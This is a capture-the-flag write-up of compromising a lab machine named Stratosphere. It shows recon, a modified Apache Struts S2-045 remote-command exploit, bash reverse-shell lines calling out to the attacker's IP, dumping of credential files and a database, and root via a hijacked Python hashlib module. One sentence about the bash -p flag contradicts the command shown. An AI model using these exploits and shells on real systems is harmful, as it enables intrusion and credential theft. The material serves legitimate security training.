### Stratosphere

````
nmap -A -T4 -v -oN full.nmap -p- 10.10.10.64

22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
80/tcp   open  http
8080/tcp open  http-proxy
````
Found 22, 80, 8080 ports are open, so I checked out both port 80 and 8080 and I ran gobuster on both ports as there was not much to see on the sites.
````
gobuster dir -t 50 -x js,jsp,txt,html,xml -u http://10.10.10.64/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt | tee gobuster
directory-list-2.3-big.txt                                         

/index.html (Status: 200)
/main.js (Status: 200)
/manager (Status: 302)
/GettingStarted.html (Status: 200)
/Monitoring (Status: 302)
````
I tried some default credentials on the /manager but did not work and I also tried a Metasploit exploit for tomcat but it did not work.
````
msf6 > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------

 8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
````

The other interesting hit was /Monitoring
````
http://10.10.10.64:8080/Monitoring/example/Menu.action
````
I tried to look at the login page, but it wasn't working neither was the register page.
I also tried triggering 404 error page to find out the web server version and look for an exploit but nothing.
After taking a step back and checking what I know and what I have, something caught my eye. The . action extension was very unfamiliar to me, so I googled it. I found this:
````
https://stackoverflow.com/questions/1369591/action-extension-what-is-it/1369605
````
With this new information I tried to look for a CVE for Apache Struts Exploit and I found a couple of hits

I tried the following CVE which was available in msfdb but no luck
````
Tried: https://www.cvedetails.com/cve/CVE-2018-11776/
````
````
msf6 > search struts

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   2   exploit/multi/http/struts2_namespace_ognl                2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injectio Execution
````


I went back to CVE details to look around and I saw a CVE with a score of 10.0 so I decied to try that.

````
https://www.cvedetails.com/cve/CVE-2018-11776/
````
I found the exploit on exploit db
````
https://www.exploit-db.com/exploits/41570
````
I tried to get a shell for about an hour, but I could not achieve an interactive shell (see below)
and it was a bit annoying to have to run the exploit every time, so I decided to modify the exploit a little bit:
````
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] struts2_S2-045.py <url>")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        while True:
	        cmd = raw_input("cmd>")
	        exploit(url, cmd)
````
Ways I tried to get an interactive shell (Bash reverse shell, base64 encoded bash reverse shell, tried to write it into a file and then execute the script, curl did not work either). Probably there is a firewall setting blocking external connection to the target machine.

````
python exploit.py  http://10.10.10.64:8080/Monitoring/example                                                                              
[*] CVE: 2017-5638 - Apache Struts2 S2-045
cmd> ls
conf
db_connect
lib
logs
policy
webapps
work

cmd> bash -i >& /dev/tcp/10.10.10.64/4444 0>&1

cmd>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMi80NDQ0IDA+JjE= | base64 -d | bash

cmd>bash -c 'bash -i >& /dev/tcp/10.10.14.32/4444 0>&1'

cmd>echo "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1" > /tmp/asd.sh   

cmd>bash -i >& /dev/tcp/10.10.14.32/4444 0>&1" > /tmp/asd.sh

cmd>cat /tmp/asd.sh  

cmd>bash /tmp/asd.sh

cmd>cat db_connect' 
id=tomcat8
user=Richard  
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

cmd>cd /root/.nvm/versions/node/v15.10.0/bin/conf;cat tomcat-users.xml"  
teampower:cd@6sY{f^+kZV8J!+o*t|<fpNy]F_(Y$
````
First, I tried the credentials found in tomcat-user.xml, however I could not login to tomcat admin UI.
I found other credentials in the db_connect file so I tried to connect to mySQL database.
Since I do not have an interactive hence, I use mysqldump to create a backup file (Ref.: https://stackoverflow.com/questions/9497869/export-and-import-all-mysql-databases-at-one-time)

````
python exploit.py  http://10.10.10.64:8080/Monitoring/example                                                                              
[*] CVE: 2017-5638 - Apache Struts2 S2-045
cmd>mysqldump -u admin -padmin --all-databases --skip-lock-tables  

cmd>mysqldump -u admin -padmin --all-databases --skip-lock-tables > pls.sql
/bin/bash: pls.sql: Permission denied

cmd>mysqldump -u admin -padmin --all-databases --skip-lock-tables > /tmp/pls.sql

cmd>cat /tmp/pls.sql
[...]
INSERT INTO `accounts` VALUES ('Richard F. Smith','9tc*rhKuG5TyXvUJOrE^5CK7k','richard');
[...]
````

After getting the password for Richard I tried to ssh in with the following credentials: richard:9tc*rhKuG5TyXvUJOrE^5CK7k

````
sudo -l
(ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
````
**import hashlib** -> has to create another python script because python looking for dependencies ine the current working directory first

Creating hashlib.py in cwd:
````
import os
os.system('chmod +s /bin/bash')
````
After creating a hashlib.py in the cwd I ran the following command:
````
sudo /usr/bin/python3 /home/richard/test.py
````

And I checked if I got the suid binary on bash
````
richard@stratosphere:~$ ls -al /bin/
total 9588
drwxr-xr-x  2 root root    4096 Feb  5  2018 .
drwxr-xr-x 22 root root    4096 Feb 27  2018 ..
-rwsr-sr-x  1 root root 1099016 May 15  2017 bash
[...]
````

Finally run bash without -p flag to keep privileges.
````
 /bin/bash -p 
````

Other way to root to not conflict with other players.
````
import os
os.system('cp /bin/bash /tmp/asd')
os.system('chmod +s /tmp/asd')
````
````
-bash-4.4$ sudo /usr/bin/python3 /home/richard/test.py
-bash-4.4$ /tmp/asd -p
asd-4.4# id
uid=1000(richard) gid=1000(richard) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner),1000(richard)
asd-4.4# 
````
